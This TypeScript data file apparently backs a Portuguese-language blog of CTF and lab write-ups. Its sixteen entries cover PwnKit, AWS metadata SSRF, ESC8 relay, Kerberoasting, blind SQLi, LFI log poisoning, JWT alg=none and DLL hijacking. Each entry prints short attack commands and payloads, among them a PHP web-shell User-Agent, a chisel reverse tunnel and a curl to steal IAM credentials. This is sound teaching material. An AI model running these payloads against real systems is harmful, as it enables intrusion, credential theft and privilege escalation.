export type WriteupStatus = 'published' | 'draft';

export type Writeup = {
  slug: string;
  title: string;
  date: string;
  dateLabel: string;
  read: string;
  difficulty: string;
  platform: string;
  os: string;
  tags: string[];
  mitre: string[];
  summary: string;
  status: WriteupStatus;
  content: string;
};

export const PLATFORMS = ['THM', 'HTB', 'Solyd', 'PortSwigger', 'VulnHub'];
export const DIFFICULTIES = ['Fácil', 'Média', 'Difícil', 'Insano'];
export const SYSTEMS = ['Linux', 'Windows'];

const MONTH_ABBR = ['jan', 'fev', 'mar', 'abr', 'mai', 'jun', 'jul', 'ago', 'set', 'out', 'nov', 'dez'];

export function formatDateLabel(isoDate: string): string {
  const [year, month, day] = isoDate.split('-').map(Number);
  return `${String(day).padStart(2, '0')} ${MONTH_ABBR[month - 1]} ${year}`;
}

export const writeups: Writeup[] = [
  {
    slug: 'pwnkit-cve-2021-4034',
    title: 'Escalando de www-data a root via PwnKit (CVE-2021-4034)',
    date: '2026-06-14', dateLabel: '14 jun 2026', read: '8 min',
    difficulty: 'Difícil', platform: 'THM', os: 'Linux',
    tags: ['linux', 'privesc', 'pkexec'],
    mitre: ['T1068 - Exploitation for Privilege Escalation'],
    summary: 'Reconstruindo o exploit do polkit do zero e entendendo o que o patch realmente muda.',
    status: 'published',
    content: `## Enumeração inicial

A máquina expunha apenas SSH e uma aplicação web simples em Flask. O usuário www-data tinha acesso de escrita a um diretório de uploads, mas nada óbvio de RCE direto — então o caminho era achar um jeito de virar usuário de verdade primeiro.

Depois de um shell reverso via upload de um arquivo malicioso disfarçado de imagem, a enumeração local mostrou uma versão do pkexec vulnerável ao CVE-2021-4034, conhecido como PwnKit.

## Explorando o PwnKit

O exploit abusa de como o pkexec trata argv[0] vazio, fazendo ele interpretar variáveis de ambiente como se fossem parâmetros de linha de comando. Isso permite injetar uma variável GCONV_PATH controlada e carregar um módulo arbitrário com privilégios de root.

\`\`\`bash
gcc -shared -fPIC -o pwnkit.so pwnkit.c
PATH=GCONV_PATH=. SHELL=pwnkit.so pkexec
\`\`\`

## Privesc para root

Rodar o binário compilado devolveu um shell root direto, sem precisar de senha nem interação. Vale lembrar que o patch oficial simplesmente rejeita argv[0] vazio — não fecha a classe de bug, só essa instância específica dela.

:::flag
THM{pwnk1t_argv_n3ver_emptyy}
:::`,
  },
  {
    slug: 'ssrf-aws-metadata',
    title: 'SSRF cego até RCE no metadata endpoint da AWS',
    date: '2026-06-02', dateLabel: '02 jun 2026', read: '12 min',
    difficulty: 'Difícil', platform: 'HTB', os: 'Linux',
    tags: ['cloud', 'ssrf', 'aws'],
    mitre: ['T1190 - Exploit Public-Facing Application', 'T1552.005 - Cloud Instance Metadata API'],
    summary: 'Encadeando uma SSRF discreta até credenciais IAM e, de lá, execução remota.',
    status: 'published',
    content: `## A SSRF que ninguém validava

O endpoint /preview?url= baixava uma imagem remota pra gerar uma thumbnail. Apontando a URL para http://169.254.169.254/latest/meta-data/, a aplicação respondia com o conteúdo bruto — sem validar esquema, host ou range de IP.

## De metadata a credenciais IAM

A partir daí bastou ajustar o path para iam/security-credentials/<role> e pegar as credenciais temporárias da role anexada à instância.

\`\`\`bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role
\`\`\`

## RCE via S3

Com as credenciais em mãos, o bucket S3 usado para deploy estava com policy aberta demais: dava para sobrescrever o pacote de build consumido pelo pipeline e ganhar execução de código na próxima implantação.

:::flag
HTB{ssrf_t0_iam_t0_rce}
:::`,
  },
  {
    slug: 'bypass-waf-unicode',
    title: 'Bypass de WAF com normalização de Unicode',
    date: '2026-05-21', dateLabel: '21 mai 2026', read: '6 min',
    difficulty: 'Média', platform: 'PortSwigger', os: 'Linux',
    tags: ['web', 'waf', 'evasion'],
    mitre: ['T1190 - Exploit Public-Facing Application'],
    summary: 'Por que a sua regra de bloqueio não enxerga o que o servidor decodifica depois.',
    status: 'published',
    content: `## A regra que só olhava ASCII

O WAF bloqueava qualquer payload com <script literal, mas normalizava a entrada para NFKC só depois de já ter decidido bloquear ou não — ou seja, validava antes de normalizar.

## Unicode equivalente, bypass direto

Usando o caractere fullwidth ＜script＞ (que o navegador e o backend normalizam para <script> depois), o payload passava direto pela regra.

\`\`\`text
＜script＞alert(document.domain)＜/script＞
\`\`\`

## A correção certa

O fix não é adicionar mais variações à blocklist — é normalizar a entrada antes de qualquer decisão de bloqueio, ou simplesmente trocar a abordagem para allowlist.`,
  },
  {
    slug: 'loader-dotnet-ofuscado',
    title: 'Desempacotando um loader .NET ofuscado',
    date: '2026-05-09', dateLabel: '09 mai 2026', read: '15 min',
    difficulty: 'Insano', platform: 'HTB', os: 'Windows',
    tags: ['malware', 'reversing', 'dotnet'],
    mitre: ['T1027 - Obfuscated Files or Information', 'T1140 - Deobfuscate/Decode Files or Information'],
    summary: 'Do dump de memória ao IL limpo, sem ficar chutando no escuro.',
    status: 'published',
    content: `## Um loader em camadas

A amostra era um .NET empacotado com um obfuscador comercial, com strings criptografadas e um loader que descompactava o payload real só em memória.

## Removendo a primeira camada

Com de4dot foi possível remover boa parte da ofuscação de nomes e desembaralhar o controle de fluxo. O que sobrou foi um Assembly.Load carregando um array de bytes derivado de uma chave fixa no binário.

\`\`\`csharp
byte[] payload = Decrypt(Resources.blob, hardcodedKey);
Assembly.Load(payload).EntryPoint.Invoke(null, null);
\`\`\`

## O payload real

Dentro do array estava um segundo .NET muito mais simples, sem ofuscação, que abria um canal C2 via HTTP simples — a parte difícil era só chegar até ele.`,
  },
  {
    slug: 'ad-esc8-domain-admin',
    title: 'Active Directory: de usuário comum a Domain Admin com ESC8',
    date: '2026-04-27', dateLabel: '27 abr 2026', read: '11 min',
    difficulty: 'Insano', platform: 'HTB', os: 'Windows',
    tags: ['ad', 'adcs', 'ntlm'],
    mitre: ['T1649 - Steal or Forge Authentication Certificates', 'T1078 - Valid Accounts'],
    summary: 'Coerção de autenticação e relay para o AD CS, passo a passo, com as defesas.',
    status: 'published',
    content: `## AD CS com HTTP habilitado

O Certificate Authority do domínio tinha o endpoint web de enrollment (certsrv) habilitado, o que é o pré-requisito para o ESC8: relay de autenticação NTLM direto para emissão de certificado.

## Forçando a autenticação

Com PetitPotam, coergi a máquina do Domain Controller a se autenticar contra um host controlado por mim, e relayei essa autenticação para o endpoint de enrollment via ntlmrelayx.

\`\`\`bash
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs
\`\`\`

## Domain Admin via certificado

O certificado emitido em nome da máquina do DC permitiu solicitar um TGT via PKINIT e, a partir dele, extrair o hash NTLM da própria conta de máquina — caminho direto até Domain Admin.

:::flag
HTB{esc8_pkinit_ftw}
:::`,
  },
  {
    slug: 'kerberoasting-na-pratica',
    title: 'Kerberoasting na prática, do request ao hash quebrado',
    date: '2026-04-15', dateLabel: '15 abr 2026', read: '9 min',
    difficulty: 'Média', platform: 'THM', os: 'Windows',
    tags: ['ad', 'kerberos'],
    mitre: ['T1558.003 - Kerberoasting'],
    summary: 'Do pedido de TGS ao hash quebrado offline, sem ferramentas mágicas no meio do caminho.',
    status: 'published',
    content: `## Pedindo tickets sem alarde

Qualquer usuário autenticado no domínio pode solicitar um ticket de serviço (TGS) para qualquer conta com um SPN registrado — não precisa de privilégio nenhum além de estar no domínio.

\`\`\`bash
impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.10.10.10 -request
\`\`\`

## Quebrando offline

O ticket vem criptografado com o hash NTLM da conta de serviço. Como a senha dessa conta de serviço era um nome de produto com ano, o hashcat resolveu em poucos minutos com uma wordlist customizada.

## A lição de sempre

Conta de serviço com senha curta e SPN registrado é, na prática, uma senha que qualquer usuário do domínio pode tentar quebrar offline sem gerar nenhum log de tentativa de login.`,
  },
  {
    slug: 'blind-sqli-tempo',
    title: 'Blind SQLi baseada em tempo, sem chutar a query',
    date: '2026-04-03', dateLabel: '03 abr 2026', read: '7 min',
    difficulty: 'Média', platform: 'PortSwigger', os: 'Linux',
    tags: ['web', 'sqli'],
    mitre: ['T1190 - Exploit Public-Facing Application'],
    summary: 'Inferindo respostas bit a bit quando a aplicação não devolve nada além do tempo de resposta.',
    status: 'published',
    content: `## Sem erro, sem união, só tempo

A aplicação não devolvia mensagens de erro nem refletia dados da query — a única pista era o tempo de resposta variando conforme a condição da subquery era verdadeira ou falsa.

\`\`\`sql
'; IF (1=1) WAITFOR DELAY '0:0:5'--
\`\`\`

## Extraindo caractere por caractere

Com a condição de delay funcionando, o resto é automatizável: testar cada posição da string contra cada caractere possível, medindo se a resposta demorou ou não.

## Por que isso é mais lento (e mais silencioso)

Blind baseado em tempo é ordens de magnitude mais lento que UNION-based, mas também muito mais discreto — não deixa rastro óbvio em logs de erro.`,
  },
  {
    slug: 'buffer-overflow-32-bit',
    title: 'Buffer overflow clássico em binário 32-bit',
    date: '2026-03-22', dateLabel: '22 mar 2026', read: '13 min',
    difficulty: 'Difícil', platform: 'Solyd', os: 'Linux',
    tags: ['pwn', 'bof', 'stack'],
    mitre: ['T1190 - Exploit Public-Facing Application'],
    summary: 'Sobrescrevendo EIP num binário sem proteções, do crash ao shellcode funcional.',
    status: 'published',
    content: `## Sem ASLR, sem stack canary

O binário era 32-bit, compilado sem -fstack-protector e sem PIE. Bastou um pattern_create para achar o offset exato até o EIP.

\`\`\`bash
python3 -c "print('A'*112 + 'BBBB')" > input.txt
\`\`\`

## Sobrescrevendo o EIP

Com o offset confirmado em 112 bytes, troquei BBBB pelo endereço de uma instrução jmp esp encontrada na própria libc carregada, redirecionando a execução para o shellcode logo depois.

## Shell local

O shellcode era um execve clássico de 28 bytes, sem necessidade de encoder — sem NX habilitado, a stack ainda era executável.`,
  },
  {
    slug: 'lfi-log-poisoning-apache',
    title: 'LFI até RCE via log poisoning no Apache',
    date: '2026-03-10', dateLabel: '10 mar 2026', read: '8 min',
    difficulty: 'Fácil', platform: 'THM', os: 'Linux',
    tags: ['web', 'lfi'],
    mitre: ['T1505.003 - Server Software Component: Web Shell', 'T1190 - Exploit Public-Facing Application'],
    summary: 'Da inclusão de um arquivo de log até execução de código, envenenando o que o Apache grava.',
    status: 'published',
    content: `## Incluindo o que não devia

O parâmetro ?page= aceitava qualquer caminho relativo, sem sanitização de ../. Dava para ler /etc/passwd direto, mas isso só confirma a falha — não executa nada.

## Envenenando o log

Mandando um User-Agent com PHP embutido e depois incluindo o log de acesso do Apache via LFI, o PHP dentro do log é interpretado e executado pelo servidor.

\`\`\`text
User-Agent: <?php system($_GET['cmd']); ?>
\`\`\`

\`\`\`text
GET /index.php?page=../../../../var/log/apache2/access.log&cmd=id
\`\`\`

## RCE completo

A partir do system() funcionando, o resto é o caminho normal: subir uma reverse shell e seguir para enumeração local.

:::flag
THM{lfi_log_p0is0n_classic}
:::`,
  },
  {
    slug: 'pivoting-chisel-proxychains',
    title: 'Pivotando para a rede interna com chisel e proxychains',
    date: '2026-02-26', dateLabel: '26 fev 2026', read: '10 min',
    difficulty: 'Média', platform: 'HTB', os: 'Linux',
    tags: ['pivoting', 'network'],
    mitre: ['T1090 - Proxy', 'T1572 - Protocol Tunneling'],
    summary: 'Abrindo um túnel SOCKS pra alcançar hosts que o firewall nunca deixaria eu ver direto.',
    status: 'published',
    content: `## Uma rede que não devia estar visível

O primeiro host comprometido tinha uma segunda interface numa rede 10.10.20.0/24 totalmente inacessível da minha máquina.

## Túnel com chisel

Subi um servidor chisel na minha máquina e um client no host comprometido, abrindo um proxy SOCKS que expõe a rede interna como se eu estivesse nela.

\`\`\`bash
./chisel server -p 8000 --reverse
./chisel client 10.10.14.1:8000 R:1080:socks
\`\`\`

## Escaneando através do proxy

Com proxychains apontando para a porta 1080, ferramentas comuns como nmap e smbclient passaram a funcionar contra a rede interna sem nenhuma modificação.

\`\`\`bash
proxychains nmap -sT -Pn 10.10.20.0/24
\`\`\``,
  },
  {
    slug: 'jwt-assinatura-mal-validada',
    title: 'Quebrando um JWT com assinatura mal validada',
    date: '2026-02-12', dateLabel: '12 fev 2026', read: '5 min',
    difficulty: 'Fácil', platform: 'PortSwigger', os: 'Linux',
    tags: ['web', 'jwt', 'auth'],
    mitre: ['T1556 - Modify Authentication Process'],
    summary: 'Trocando o algoritmo de assinatura para none e entrando sem nunca ver a chave secreta.',
    status: 'published',
    content: `## A biblioteca confiava demais no header

O servidor usava o campo alg do próprio token para decidir como validar a assinatura — incluindo aceitar none como valor válido, sem assinatura nenhuma.

\`\`\`bash
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
\`\`\`

## Reescrevendo o payload

Trocando o sub do payload para um usuário administrativo e removendo a assinatura, o token ainda era aceito — o servidor nunca chegou a validar nada.

## A correção

A regra de ouro: o algoritmo de verificação deve ser fixado no lado do servidor, nunca lido a partir do próprio token recebido.`,
  },
  {
    slug: 'gtfobins-sudo-mal-configurado',
    title: 'GTFOBins: escapando de um sudo mal configurado',
    date: '2026-01-30', dateLabel: '30 jan 2026', read: '6 min',
    difficulty: 'Fácil', platform: 'Solyd', os: 'Linux',
    tags: ['linux', 'privesc', 'sudo'],
    mitre: ['T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching'],
    summary: 'Uma linha de sudo mal pensada e um binário comum vira convite direto para root.',
    status: 'published',
    content: `## Um sudo "inofensivo"

sudo -l mostrava que o usuário podia rodar /usr/bin/find como root, sem senha — algo que parece inofensivo até você lembrar do GTFOBins.

\`\`\`bash
sudo find . -exec /bin/sh \\; -quit
\`\`\`

## Root em uma linha

O find aceita -exec para rodar comandos arbitrários sobre cada resultado — e como ele herda os privilégios de quem o chamou, o shell resultante já é root.

## A lição

Qualquer binário que permita executar comandos arbitrários (find, vim, less, awk...) virando sudo sem senha é, na prática, root direto. O GTFOBins existe exatamente para catalogar esses casos.

:::flag
SOLYD{gtfobins_find_root}
:::`,
  },
  {
    slug: 'dll-hijacking-windows',
    title: 'Abusando de DLL hijacking para escalar no Windows',
    date: '2026-01-18', dateLabel: '18 jan 2026', read: '12 min',
    difficulty: 'Difícil', platform: 'VulnHub', os: 'Windows',
    tags: ['windows', 'privesc', 'dll'],
    mitre: ['T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking'],
    summary: 'Aproveitando a ordem de busca de DLLs do Windows pra carregar código onde não deveria.',
    status: 'published',
    content: `## A ordem de busca de DLLs

O executável era assinado e rodava com privilégios elevados, mas carregava uma DLL auxiliar pelo nome, sem caminho absoluto — o que faz o Windows procurar primeiro no diretório de trabalho atual.

## Plantando a DLL maliciosa

Coloquei uma DLL com o mesmo nome e os mesmos exports (encaminhando para a DLL original) num diretório com permissão de escrita que ficava antes da DLL legítima na ordem de busca.

\`\`\`text
DllMain -> CreateProcess("cmd.exe /c net localgroup administrators me /add")
\`\`\`

## Persistência e escalada

Na próxima vez que o serviço reiniciou, ele carregou minha DLL com os privilégios dele — suficiente para criar uma conta administrativa local.`,
  },
  {
    slug: 'smb-null-session',
    title: 'Enumeração de SMB com null session, do zero',
    date: '2026-01-05', dateLabel: '05 jan 2026', read: '7 min',
    difficulty: 'Fácil', platform: 'THM', os: 'Windows',
    tags: ['smb', 'recon'],
    mitre: ['T1135 - Network Share Discovery'],
    summary: 'O que uma sessão sem credenciais ainda consegue enumerar num compartilhamento mal configurado.',
    status: 'published',
    content: `## Sessão sem credencial nenhuma

O servidor SMB aceitava sessão nula — sem usuário, sem senha — o que por padrão já deveria estar desabilitado desde versões antigas do Windows.

\`\`\`bash
smbclient -L //10.10.10.10 -N
\`\`\`

## O que dava para enumerar

Com a sessão nula, enum4linux-ng listou usuários do domínio, política de senha e até shares com permissão de leitura — informação suficiente pra montar uma lista de spray de senha.

## Por que isso ainda aparece

Em ambientes legados, sessão nula costuma sobrar de uma configuração antiga nunca revisada — vale sempre testar, mesmo em 2026.`,
  },
  {
    slug: 'race-condition-upload',
    title: 'Race condition em upload de arquivos',
    date: '2025-12-20', dateLabel: '20 dez 2025', read: '9 min',
    difficulty: 'Difícil', platform: 'PortSwigger', os: 'Linux',
    tags: ['web', 'race'],
    mitre: ['T1190 - Exploit Public-Facing Application'],
    summary: 'Ganhando a corrida entre validação e gravação de arquivo pra burlar um filtro de upload.',
    status: 'published',
    content: `## Validação depois, gravação antes

O endpoint de upload salvava o arquivo no disco e só depois verificava a extensão, deletando arquivos inválidos — uma janela pequena, mas real, entre os dois passos.

## Ganhando a corrida

Disparando dezenas de requisições simultâneas para o mesmo upload malicioso, algumas conseguiam ser acessadas via HTTP antes do processo de validação terminar e deletar o arquivo.

\`\`\`bash
for i in $(seq 1 30); do curl -s http://target/uploads/shell.php & done
\`\`\`

## Por que isso é difícil de notar em teste manual

Manualmente, a janela de corrida é pequena demais para perceber — só aparece com requisições concorrentes de verdade, daí a importância de testar isso especificamente.`,
  },
  {
    slug: 'crackme-go-reversing',
    title: 'Engenharia reversa de um crackme escrito em Go',
    date: '2025-12-08', dateLabel: '08 dez 2025', read: '14 min',
    difficulty: 'Insano', platform: 'VulnHub', os: 'Linux',
    tags: ['reversing', 'golang'],
    mitre: ['T1027 - Obfuscated Files or Information'],
    summary: 'Lendo binário Go compilado estaticamente sem perder a paciência com os símbolos do runtime.',
    status: 'published',
    content: `## Binário estático, símbolos gigantes

Binários Go compilados estaticamente vêm com toda a standard library embutida, o que deixa o binário enorme e a lista de símbolos poluída — o trecho relevante está escondido no meio de muito ruído.

## Achando a função de verificação

Filtrando por strings específicas do programa (não da stdlib), encontrei a função main.checkFlag, que comparava a entrada com um array de bytes gerado por XOR contra uma chave fixa.

\`\`\`go
for i, b := range input {
    if b^key[i%len(key)] != expected[i] {
        return false
    }
}
\`\`\`

## Recuperando a flag

Com o array expected e a key extraídos do binário, reconstruir a flag original foi só inverter o XOR em um script Python de poucas linhas.

:::flag
VH{g0_b1n4r1es_4r3_n0t_th4t_scary}
:::`,
  },
];

export function getWriteup(slug: string): Writeup | undefined {
  return writeups.find((w) => w.slug === slug);
}

export function todayIso(): string {
  return new Date().toISOString().slice(0, 10);
}

export function createBlankWriteup(slug: string, title = ''): Writeup {
  const date = todayIso();
  return {
    slug,
    title,
    date,
    dateLabel: formatDateLabel(date),
    read: '1 min',
    difficulty: DIFFICULTIES[0],
    platform: PLATFORMS[0],
    os: SYSTEMS[0],
    tags: [],
    mitre: [],
    summary: '',
    status: 'draft',
    content: '',
  };
}
